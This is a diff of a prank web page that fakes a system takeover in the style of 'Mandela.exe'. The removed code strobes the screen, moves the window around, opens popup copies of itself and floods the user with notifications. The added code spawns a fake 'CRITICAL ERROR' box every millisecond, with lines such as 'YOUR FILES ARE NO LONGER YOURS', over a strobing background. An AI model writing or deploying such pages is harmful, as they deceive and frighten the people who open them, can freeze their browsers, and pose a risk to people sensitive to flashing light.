@@ -1,41 +1,95 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>VOID</title>
+    <meta charset="UTF-8">
+    <title>⚠️ SYSTEM CRITICAL ⚠️</title>
     <style>
-        body { background: #000; margin: 0; overflow: hidden; animation: flash 0.02s infinite; }
-        @keyframes flash { 0% { background: #fff; } 50% { background: #000; } }
+        * {
+            box-sizing: border-box;
+        }
+        body {
+            background-color: #000;
+            color: #ff0000;
+            font-family: 'Courier New', Courier, monospace;
+            overflow: hidden;
+            margin: 0;
+            padding: 0;
+            user-select: none;
+            width: 100vw;
+            height: 100vh;
+        }
+        .mandela-box {
+            position: absolute;
+            background: #050505;
+            border: 3px double #ff0000;
+            padding: 8px;
+            box-shadow: 0 0 20px #ff0000;
+            font-weight: bold;
+            font-size: 14px;
+            width: 280px;
+            z-index: 9999;
+            pointer-events: none; /* Prevents clicks from slowing it down */
+        }
+        .title-bar {
+            background: #ff0000;
+            color: #000;
+            padding: 2px 6px;
+            margin: -8px -8px 8px -8px;
+            font-size: 11px;
+            letter-spacing: 1px;
+        }
     </style>
 </head>
-<body onload="chaos()">
+<body>
+
     <script>
-        let x = Math.random() * (screen.availWidth - 300);
-        let y = Math.random() * (screen.availHeight - 300);
-        let dx = 35, dy = 35; // Extreme speed
+        // Classic Mandela.exe inspired aesthetic lines
+        const payloads = [
+            "SYSTEM CORRUPTION DETECTED",
+            "MANDELA.EXE HAS TAKEN CONTROL",
+            "DO NOT LOOK BEHIND YOU",
+            "YOUR FILES ARE NO LONGER YOURS",
+            "SYSTEM FAILURE IMMINENT",
+            "CRITICAL_ERROR: VOID_DETECTED",
+            "THERE IS NOT ENOUGH ROOM FOR BOTH OF US",
+            "AN UNKNOWN ENTITY IS TRACKING YOUR PATH",
+            "RECEIVING INBOUND DATA FROM [UNKNOWN]"
+        ];
 
-        function chaos() {
-            // Bouncing
-            setInterval(() => {
-                x += dx; y += dy;
-                if (x + 300 > screen.availWidth || x < 0) dx = -dx;
-                if (y + 300 > screen.availHeight || y < 0) dy = -dy;
-                window.moveTo(x, y);
-            }, 10);
+        // Cache window dimensions for speed optimization
+        let wWidth = window.innerWidth;
+        let wHeight = window.innerHeight;
 
-            // Replicate
-            setTimeout(() => {
-                window.open('notifacations.html', '_blank', 'width=300,height=300');
-            }, 500);
+        // Update dimensions if window resizes
+        window.onresize = () => {
+            wWidth = window.innerWidth;
+            wHeight = window.innerHeight;
+        };
 
-            // Spam Notifications
-            Notification.requestPermission().then(p => {
-                if(p === 'granted') {
-                    setInterval(() => {
-                        new Notification("CRITICAL", { body: "SYSTEM_LOST", silent: true });
-                    }, 200);
-                }
-            });
+        function unleashPayload() {
+            // High-speed DOM element generation
+            const box = document.createElement('div');
+            box.className = 'mandela-box';
+            
+            const text = payloads[Math.floor(Math.random() * payloads.length)];
+            box.innerHTML = `<div class="title-bar">✖ CRITICAL ERROR</div>` + text;
+
+            // Hyper-randomized placement
+            const x = Math.random() * (wWidth - 290);
+            const y = Math.random() * (wHeight - 100);
+            box.style.left = x + 'px';
+            box.style.top = y + 'px';
+
+            document.body.appendChild(box);
+
+            // Fast strobe background glitch
+            document.body.style.backgroundColor = (document.body.style.backgroundColor === 'rgb(0, 0, 0)' || document.body.style.backgroundColor === '') ? '#1a0000' : '#000000';
         }
+
+        // Set interval to 1 millisecond for ultra-fast spawning
+        window.onload = function() {
+            setInterval(unleashPayload, 1);
+        };
     </script>
 </body>
 </html>
